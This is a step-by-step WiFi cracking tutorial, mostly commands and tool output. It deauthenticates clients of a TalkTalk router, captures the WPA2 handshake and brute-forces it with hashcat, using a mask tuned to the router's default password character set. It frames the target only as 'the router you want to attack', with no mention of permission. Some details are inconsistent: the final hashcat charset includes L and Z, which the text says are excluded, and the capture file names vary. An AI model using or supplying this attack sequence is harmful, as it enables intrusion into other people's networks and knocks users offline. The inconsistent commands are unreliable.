# WiFi Hacking 101

## Goal

Capture a handshake between a device and a router. The EAPOL 4-way handshake is essentially an encrypted version of the WiFi password. We can acquire these without being on the network with minimal hardware and little to no cost. In this example I'm using a ~$5 Ralink USB WiFi dongle from about 8 years ago, only because I'm using a Mac though, Most PC's should support injection with the built in card, so no need for an extra dongle.

**_RUN COMMANDS AS ROOT OR USE SUDO_**

## Gather Info

Run iwconfig to get the wifi adapter name

`iwconfig`

It should print something like this:

```plaintext
lo        no wireless extensions.

enp0s1    no wireless extensions.

wlx00198671d2c9  IEEE 802.11  ESSID:off/any
          Mode:Managed  Access Point: Not-Associated   Tx-Power=20 dBm
          Retry short  long limit:2   RTS thr:off   Fragment thr:off
          Encryption key:off
          Power Management:off
```

**_lo_** is the loopback interface (the computer you're running from)

**_enp0s1_** is the ethernet interface, en in the name for 'ethernet'

**_wlx00198671d2c9_** is our wifi card, 'wl' in the name for 'wireless'. Make a note of this.

`airodump-ng wlx00198671d2c9`

This displays a table of available networks around you to connect to and any devices connected to them and which router they are connected to like this

```plaintext
 CH  6 ][ Elapsed: 36 s ][ 2025-01-23 06:10

 BSSID              PWR  Beacons    #Data, #/s  CH   MB    ENC CIPHER  AUTH ESSID

 A2:7E:79:7F:1D:A2  -83        5        0    0   6  130   WPA2 CCMP   PSK  iPhone (6)
 72:B6:87:13:4E:AB  -83        2        0    0  11  195   OPN              EE WiFi
 00:1E:80:FE:15:B4  -81        5        0    0   1  130   WPA2 CCMP   PSK  Grain-1217135
 D0:6D:C9:EF:33:AA  -79       14        4    0   1  195   WPA2 CCMP   PSK  TALKTALKEF33AD
 98:42:65:D2:8E:47  -73       13        5    0   6  195   WPA2 CCMP   PSK  TALKTALKD28E4A
 C0:D7:AA:B1:E2:CD  -81       11        2    0  11  195   WPA2 CCMP   PSK  BT-MJCTN3
 6A:D7:AA:B1:E2:C9  -81       13        0    0  11  195   WPA2 CCMP   PSK  <length:  9>
 AC:B6:87:13:4E:AA  -82        1        2    0  11  195   WPA2 CCMP   PSK  BTB-JSCGJH
 F8:0D:A9:18:43:FF  -70       13        0    0   3  260   WPA3 CCMP   SAE  GRAIN_43FF
 44:D4:53:01:CB:0D  -79       15        0    0   1  195   WPA2 CCMP   PSK  TALKTALK01CB10

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes


 AC:B6:87:13:4E:AA  F0:C8:14:90:60:C0  -80    0 - 1e     0       18
 C0:D7:AA:B1:E2:CD  12:A5:0A:CA:7B:35  -84    0 - 2e     0        2
 (not associated)   54:C9:DF:77:40:6F  -76    0 - 1      0        2
 F8:0D:A9:18:43:FF  32:99:8C:3B:8D:1B  -72    0 -24      0        1
```

We're interested in the MAC Address (BSSID) of the router and the channel it's running on.

In the above example it's 98:42:65:D2:8E:47 and channel 6. We'll use these in the next steps.

## Put your wifi card in Monitor mode

`airmon-ng`

```plaintext
PHY     Interface        Driver     Chipset

phy0    wlx00198671d2c9  rt2800usb  Ralink Technology, Corp. RT5370
```

`airmon-ng check kill`

`airmon-ng start wlx00198671d2c9`

```plaintext
PHY     Interface        Driver     Chipset

phy1    wlx00198671d2c9  rt2800usb  Ralink Technology, Corp. RT5370
Interface wlx00198671d2c9mon is too long for linux so it will be renamed to the old style (wlan#) name.

        (mac80211 monitor mode vif enabled on [phy1]wlan0mon
        (mac80211 station mode vif disabled for [phy1]wlx00198671d2c9)
```

My card had a long name so airmon changed it to a simpler default when I put it into monitor mode to **wlan0mon**.

Check airmon-ng again, it should now display your card in monitor mode, Note how 'wlx00198671d2c9' is now 'wlan0mon'

`airmon-ng`

```plaintext
PHY     Interface   Driver      Chipset

phy1    wlan0mon    rt2800usb   Ralink Technology, Corp. RT5370
```

## The attack

Open 2 terminal tabs/windows and run airodump-ng again. This time point it at the MAC address (bssid) and channel of the router you want to attack. we pass `-w` as an argument to write/save to a file

`airodump-ng --bssid 98:42:65:D2:8E:47 -c6 wlan0mon -w handshake`

In another window, start kicking devices off the router by spamming it with deauth packets.

Aireplay-ng is the replay attack suite. we use it to replay packets and inject deauth frames to a specific router, running on a certain channel using attack mode ‘0’ (Deauth Attack). The number ‘0’ after it is the amount of Deauth frames to send. If set to 0, it sends indefinitely (AKA kick people off WiFi). Finally you give a WiFi adapter to inject the frames from, in this case it’s my cheap old Ralink WiFi adapter. This cost less than $5 over 6-7 years ago and it’s only 2.4GHz so it’s impressive to see it still capable of performing the attacks described in 2025.

`aireplay-ng -a 98:42:65:D2:8E:47 -0 0 wlan0mon`

It's better to attack a specific device if you can. You can specify one with -c like this

`aireplay-ng -a 98:42:65:D2:8E:47 -c 6E:EB:E6:7B:9B:BB -0 0 wlan0mon`

```plaintext
root@debian:/home/a# aireplay-ng -a 98:42:65:D2:8E:47 -0 0 wlan0mon
08:34:27  Waiting for beacon frame (BSSID: 98:42:65:D2:8E:47) on channel 6
NB: this attack is more effective when targeting
a connected wireless client (-c <clients mac>).
08:34:27  Sending DeAuth (code 7) to broadcast -- BSSID: [98:42:65:D2:8E:47]
08:34:27  Sending DeAuth (code 7) to broadcast -- BSSID: [98:42:65:D2:8E:47]
08:34:28  Sending DeAuth (code 7) to broadcast -- BSSID: [98:42:65:D2:8E:47]
08:34:28  Sending DeAuth (code 7) to broadcast -- BSSID: [98:42:65:D2:8E:47]
08:34:29  Sending DeAuth (code 7) to broadcast -- BSSID: [98:42:65:D2:8E:47]

root@debian:/home/a# aireplay-ng -a 98:42:65:D2:8E:47 -c 6E:EB:E6:7B:9B:BB -0 0 wlan0mon
08:33:49  Waiting for beacon frame (BSSID: 98:42:65:D2:8E:47) on channel 6
08:33:49  Sending 64 directed DeAuth (code 7). STMAC: [6E:EB:E6:7B:9B:BB] [ 0|51 ACKs]
08:33:50  Sending 64 directed DeAuth (code 7). STMAC: [6E:EB:E6:7B:9B:BB] [ 0|64 ACKs]
08:33:51  Sending 64 directed DeAuth (code 7). STMAC: [6E:EB:E6:7B:9B:BB] [ 0|63 ACKs]
08:33:51  Sending 64 directed DeAuth (code 7). STMAC: [6E:EB:E6:7B:9B:BB] [ 0|61 ACKs]
08:33:52  Sending 64 directed DeAuth (code 7). STMAC: [6E:EB:E6:7B:9B:BB] [ 0|61 ACKs]
```

Leave that running and back in the first window you'll see the same interface as before but this time we are watching the top right of the window

```plaintext
 CH  6 ][ Elapsed: 5 mins ][ 2025-01-23 07:50 ][ WPA handshake: 98:42:65:D2:8E:47

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB    ENC  CIPHER  AUTH  ESSID


 98:42:65:D2:8E:47  -58 100     3302      619    0   6  195   WPA2  CCMP    PSK   TALKTALKD28E4A

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 (not associated)   82:2F:2E:B6:06:FE  -48    0 - 1      0        1         TALKTALKD28E4A
 98:42:65:D2:8E:47  1A:0D:68:A3:17:EC  -40    1e- 1      0       38         TALKTALKD28E4A
 98:42:65:D2:8E:47  6E:EB:E6:7B:9B:BB  -58    1e- 1e     0       13  EAPOL  TALKTALKD28E4A

```

At the top right it now says: **WPA handshake: 98:42:65:D2:8E:47**. Under notes it also says EAPOL which means it captured the EAPOL handshake from that device.

The `-w handshake` on the above command makes sure it writes the handshake capture to a file named handshake. The handshake is basically the encrypted WiFi password. We need to convert this and decrypt it to get the actual password. We can use `hashcat` for that so make sure to install it. If we list files in the current directory with `ls -la` we should see a few files

```plaintext
handshake-01.cap
handshake-01.csv
handshake-01.kismet.csv
handshake-01.kismet.netxml
handshake-01.log.csv
```

## Getting the password

We are only really interested in the '.cap' file. We'll use a hashcat utility 'hcxpcapngtool' to convert the file into something hashcat can brute force so we can recover the password. We give `-o` for output file then specify the input (.cap) file we captured earlier

`hcxpcapngtool -o handshake1.22000 handshake-01.cap`

This will give us a '.22000' file that the newer hashcat prefers for this.

`[TIP 👀]`

```plaintext
The best thing to do is, Use Wireshark to slim down the .cap file. You need 5 packets. The 4 way handshake and the broadcast/beacon packet from the router. Use these filters

eapol
Filters packets related to the 4-way handshake (EAPOL protocol).

wlan.fc.type_subtype == 0x08:
Filters beacon frames (broadcast packets) from the router.
```

Since I am attacking a 'TALKTALK' router, We know from publicly available info that it uses

**_Numbers: 346789_**

**_Characters: ABCDEFGHJKMNPQRTUVWXY_**

Basically it uses capital A-Z and numerical 0-9 **_But_** it does miss a few numbers and letters (I,L,O,S,Z) out and we can save a **_lot_** of time by not searching for those. It goes from 146 days down to 14 for me by removing just 4 numbers and 5 characters. See Hashcat output below for each command

`hashcat -m 22000 -a 3 handshake01.22000 -1 0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ ?1?1?1?1?1?1?1?1 -w 3 --status`

```plaintext
Session..........: hashcat
Status...........: Running
Hash.Mode........: 22000 (WPA-PBKDF2-PMKID+EAPOL)
Hash.Target......: handshake1.22000
Time.Started.....: Thu Jan 23 16:54:33 2025 (8 secs)
Time.Estimated...: Thu Jun 19 01:15:53 2025 (146 days, 7 hours)
Kernel.Feature...: Pure Kernel
Guess.Mask.......: ?1?1?1?1?1?1?1?1 [8]
Guess.Charset....: -1 0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ, -2 Undefined, -3 Undefined, -4 Undefined
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   223.2 kH/s (69.89ms) @ Accel:16 Loops:1024 Thr:128 Vec:1
Recovered........: 0/1 (0.00%) Digests (total), 0/1 (0.00%) Digests (new)
Progress.........: 1769472/2821109907456 (0.00%)
Rejected.........: 0/1769472 (0.00%)
Restore.Point....: 0/78364164096 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:27-28 Iteration:2048-3072
Candidate.Engine.: Device Generator
Candidates.#1....: E2345678 -> ER3BERIN
Hardware.Mon.SMC.: Fan0: 28%, Fan1: 28%
Hardware.Mon.#1..: Util: 99%
```

`hashcat -m 22000 -a 3 handshake1.22000 -1 346789ABCDEFGHJKMNPQRTUVWXY ?1?1?1?1?1?1?1?1 -w 3 --status`

```plaintext
Session..........: hashcat
Status...........: Running
Hash.Mode........: 22000 (WPA-PBKDF2-PMKID+EAPOL)
Hash.Target......: handshake1.22000
Time.Started.....: Thu Jan 23 16:55:39 2025 (2 secs)
Time.Estimated...: Fri Feb  7 13:41:22 2025 (14 days, 20 hours)
Kernel.Feature...: Pure Kernel
Guess.Mask.......: ?1?1?1?1?1?1?1?1 [8]
Guess.Charset....: -1 346789ABCDEFGHJKMNPQRTUVWXY, -2 Undefined, -3 Undefined, -4 Undefined
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   219.9 kH/s (69.51ms) @ Accel:16 Loops:1024 Thr:128 Vec:1
Recovered........: 0/1 (0.00%) Digests (total), 0/1 (0.00%) Digests (new)
Progress.........: 524288/282429536481 (0.00%)
Rejected.........: 0/524288 (0.00%)
Restore.Point....: 0/10460353203 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:8-9 Iteration:1024-2048
Candidate.Engine.: Device Generator
Candidates.#1....: A8778888 -> AA8BURAN
Hardware.Mon.SMC.: Fan0: 28%, Fan1: 28%
Hardware.Mon.#1..: Util: 99%
```

To do this we make a custom character set/dictionary for hashcat to use. create a text file and put this inside. I call it custom-charset.txt but use whatever works for you.

`346789ABCDEFGHJKMNPQRTUVWXY`

Now we decrypt the stolen handshake capture to get the WiFi password.

`hashcat -m 22000 -a 3 handshake01.22000 -1 346789ABCDEFGHJKLMNPQRTUVWXYZ ?1?1?1?1?1?1?1?1 --optimized-kernel-enable -w 3 --session=my_session --status`

## Explanation

**_-m 22000:_** Specify the hash mode for WPA-PBKDF2-PMKID+EAPOL.

**_-a 3:_** Use brute-force attack mode.

**_handshake01.22000:_** The path to your .22000 file.

**_-1 346789ABCDEFGHJKLMNPQRTUVWXYZ:_** Define a custom character set directly in the command. The character set excludes problematic characters (I, O, L, S, Z) and unused numbers.

**_?1?1?1?1?1?1?1?1:_** The mask for an 8-character password.

**_--optimized-kernel-enable:_** Enables optimized kernel for better performance.

**_-w 3:_** Set workload profile to high performance.

**_--session=my_session:_** Save the session to allow pausing/resuming.

**_--status:_** Display real-time status updates.

run `hashcat --help` to get an exhaustive list of options
